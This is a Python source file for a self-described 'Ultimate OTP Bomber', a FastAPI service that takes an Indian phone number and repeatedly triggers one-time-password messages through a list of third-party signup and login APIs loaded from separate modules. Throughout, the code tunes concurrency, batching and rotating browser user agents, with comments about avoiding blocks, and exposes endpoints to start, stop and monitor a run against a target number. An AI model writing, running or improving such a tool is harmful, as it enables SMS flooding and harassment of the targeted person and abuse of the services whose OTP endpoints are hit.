#!/usr/bin/env python3
"""
🔥 ULTIMATE OTP BOMBER - FIXED v7.0 🔥
✅ SSL FIXED
✅ BATCH FIXED  
✅ VALIDATION FIXED
✅ REALISTIC IP
"""

import asyncio
import time
import random
from uuid import uuid4
from collections import defaultdict

import aiohttp
from fastapi import FastAPI, BackgroundTasks, Query
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

# ==============================================================================
# 🔥 IMPORT ALL API FILES
# ==============================================================================

ALL_API_FILES = []
for i, module_name in enumerate(["apis", "apis1", "apis2", "apis3", "apis4"]):
    try:
        mod = __import__(module_name)
        for attr in ["ULTIMATE_APIS", "ULTIMATE_APIS_2", "ULTIMATE_APIS_3", "ULTIMATE_APIS_4", "ULTIMATE_APIS_5"]:
            if hasattr(mod, attr):
                apis = getattr(mod, attr)
                if apis:
                    ALL_API_FILES.append((module_name, apis))
                    print(f"✅ {module_name}.py loaded: {len(apis)} APIs")
                    break
    except Exception as e:
        print(f"⚠️  {module_name}.py not found: {e}")

# Combine
ULTIMATE_APIS = []
for _, apis in ALL_API_FILES:
    ULTIMATE_APIS.extend(apis)

TOTAL_APIS = len(ULTIMATE_APIS)
print(f"\n{'='*60}\n🔥 TOTAL APIs LOADED: {TOTAL_APIS}\n{'='*60}\n")

# ==============================================================================
# ⚡ UVLOOP
# ==============================================================================
try:
    import uvloop
    uvloop.install()
    print("✅ uvloop installed\n")
except ImportError:
    print("⚠️  uvloop not installed\n")

# ==============================================================================
# 🚀 FASTAPI
# ==============================================================================
app = FastAPI(title="Ultimate OTP Bomber", version="7.0")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

# ==============================================================================
# ⚙️ CONFIG — FIXED
# ==============================================================================
MAX_CONCURRENT  = 500           # ⬇️ 10000 se 500 (block nahi hoga)
BATCH_CHUNK     = 30            # ⬇️ 1000 se 30 (server pe load kam)
REQUEST_TIMEOUT = 8
CONNECT_TIMEOUT = 4

REAL_USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
]

_jobs = {}
_stop_flags = set()
_stats = defaultdict(lambda: {"total": 0, "ok": 0, "otp": 0, "fail": 0, "start": 0})

# ==============================================================================
# 🔥 CORE FIRE (FIXED)
# ==============================================================================
async def fire_one(session, api, phone, stats):
    try:
        # URL
        url = api["url"](phone) if callable(api.get("url")) else api["url"]

        # Headers
        headers = dict(api.get("headers", {}))
        if not any(k.lower() == "user-agent" for k in headers.keys()):
            headers["User-Agent"] = random.choice(REAL_USER_AGENTS)

        # Payload
        data = None
        if api.get("data"):
            data = api["data"](phone) if callable(api["data"]) else api["data"]

        method = api.get("method", "POST").upper()

        # 🔥 FIXED: ssl=False hata diya + proper timeout
        if method == "POST":
            async with session.post(url, headers=headers, data=data) as r:
                status = r.status
                try:
                    txt = await r.text()
                except Exception:
                    txt = ""
        else:
            async with session.get(url, headers=headers) as r:
                status = r.status
                try:
                    txt = await r.text()
                except Exception:
                    txt = ""

        stats["total"] += 1

        # 🔥 FIXED: Sirf strong error keywords
        body_lower = txt[:800].lower()
        strong_errors = ["unauthorized", "forbidden", "blocked", "captcha required", "invalid captcha"]
        is_error = any(k in body_lower for k in strong_errors)

        if status < 400 and not is_error:
            stats["ok"] += 1
            # 🔥 FIXED: broad success keywords
            success_keys = ["success", "sent", "otp", "verified", "delivered", "code sent"]
            if any(k in body_lower for k in success_keys):
                stats["otp"] += 1
                print(f"  ✅ [{api['name']}] OTP SENT ({status})")
            else:
                print(f"  🟡 [{api['name']}] HTTP {status}")
        else:
            stats["fail"] += 1
            print(f"  ❌ [{api['name']}] HTTP {status}")

    except asyncio.TimeoutError:
        stats["total"] += 1
        stats["fail"] += 1
    except Exception:
        stats["total"] += 1
        stats["fail"] += 1

# ==============================================================================
# 🔥 WORKER (FIXED)
# ==============================================================================
async def worker(job_id, phone, count):
    _stop_flags.discard(phone)

    # 🔥 FIXED Connector
    connector = aiohttp.TCPConnector(
        limit=MAX_CONCURRENT,
        limit_per_host=20,           # ⬇️ 100 se 20
        force_close=False,
        enable_cleanup_closed=True,
        ttl_dns_cache=300,
        use_dns_cache=True
    )

    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)

    stats = _stats[phone]
    stats["total"] = 0
    stats["ok"] = 0
    stats["otp"] = 0
    stats["fail"] = 0
    stats["start"] = time.time()

    print(f"\n{'='*70}")
    print(f"🔥 [{job_id}] FIRING {TOTAL_APIS} APIs → +91{phone}")
    print(f"🔁 Cycles: {count} | Max: {MAX_CONCURRENT} | Batch: {BATCH_CHUNK}")
    print(f"{'='*70}\n")

    try:
        # 🔥 FIXED: header-less session (per-request headers)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for cycle in range(count):
                if phone in _stop_flags:
                    print(f"🛑 [{job_id}] STOPPED")
                    break

                print(f"\n🚀 CYCLE {cycle+1}/{count}\n")

                tasks = [fire_one(session, api, phone, stats) for api in ULTIMATE_APIS]

                for i in range(0, len(tasks), BATCH_CHUNK):
                    if phone in _stop_flags:
                        break
                    batch = tasks[i:i + BATCH_CHUNK]
                    await asyncio.gather(*batch, return_exceptions=True)
                    done = min(i + BATCH_CHUNK, len(tasks))
                    print(f"  📊 {done}/{len(tasks)} ({done*100//len(tasks)}%)")
                    await asyncio.sleep(0.2)  # ⬅️ FIX: Chhota delay

                elapsed = time.time() - stats["start"]
                rps = stats["total"] / elapsed if elapsed else 0

                print(f"\n{'─'*70}")
                print(f"✅ CYCLE {cycle+1}/{count} | Total: {stats['total']} | OK: {stats['ok']} | OTP: {stats['otp']} | Fail: {stats['fail']} | {rps:.1f}/s")
                print(f"{'─'*70}\n")

                await asyncio.sleep(1)

    except Exception as e:
        print(f"❌ Worker error: {e}")
    finally:
        _jobs.pop(job_id, None)
        total_time = time.time() - stats["start"]
        print(f"\n🏁 DONE: {job_id} | Total: {stats['total']} | OK: {stats['ok']} | OTP: {stats['otp']} | Fail: {stats['fail']}\n")

# ==============================================================================
# 🌐 ENDPOINTS
# ==============================================================================
@app.get("/")
async def root():
    return {
        "status": "🔥 OTP BOMBER v7.0 RUNNING",
        "total_apis": TOTAL_APIS,
        "breakdown": {name: len(apis) for name, apis in ALL_API_FILES},
        "config": {"max_concurrent": MAX_CONCURRENT, "batch": BATCH_CHUNK, "timeout": REQUEST_TIMEOUT},
        "endpoints": {
            "fire": "/send?number=9876543210&count=1",
            "stop": "/stop?number=9876543210",
            "stats": "/stats?number=9876543210"
        }
    }

@app.get("/apis")
async def list_apis():
    return {"total": TOTAL_APIS, "apis": [a["name"] for a in ULTIMATE_APIS]}

@app.get("/send")
async def send(bg: BackgroundTasks, number: str = Query(...), count: int = Query(1, ge=1, le=100)):
    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    if not number.isdigit() or len(number) != 10:
        return JSONResponse({"error": "Invalid number"}, status_code=400)

    job_id = str(uuid4())[:8]
    _jobs[job_id] = {"number": number, "count": count, "started": time.time()}
    bg.add_task(worker, job_id, number, count)

    return {
        "success": True, "job_id": job_id, "target": f"+91{number}",
        "total_apis": TOTAL_APIS, "cycles": count,
        "total_requests": count * TOTAL_APIS
    }

@app.get("/stop")
async def stop(number: str = Query(...)):
    number = number.strip().replace("+", "").replace(" ", "")
    _stop_flags.add(number)
    return {"success": True, "message": f"🛑 Stopping {number}"}

@app.get("/stats")
async def stats(number: str = Query(...)):
    number = number.strip().replace("+", "").replace(" ", "")
    s = _stats.get(number)
    if not s or not s.get("start"):
        return {"error": "No stats"}
    elapsed = time.time() - s["start"]
    return {
        "number": number, "total": s["total"], "ok": s["ok"],
        "otp": s["otp"], "fail": s["fail"],
        "elapsed_seconds": round(elapsed, 2),
        "requests_per_second": round(s["total"] / elapsed if elapsed else 0, 1),
        "success_rate": f"{(s['ok'] / s['total'] * 100):.1f}%" if s['total'] else "0%"
    }

@app.get("/jobs")
async def jobs():
    return {"active_jobs": len(_jobs), "jobs": _jobs}

# ==============================================================================
# 🚀 MAIN
# ==============================================================================
if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════════════════╗
║   🔥  ULTIMATE OTP BOMBER v7.0  🔥                      ║
║   📊 APIs: {TOTAL_APIS:<44}║
║   ⚡ Max: {MAX_CONCURRENT:<45}║
║   📦 Batch: {BATCH_CHUNK:<43}║
║   🚀 http://0.0.0.0:5000                                ║
╚══════════════════════════════════════════════════════════╝
    """)
    uvicorn.run(app, host="0.0.0.0", port=5000, log_level="warning", access_log=False)
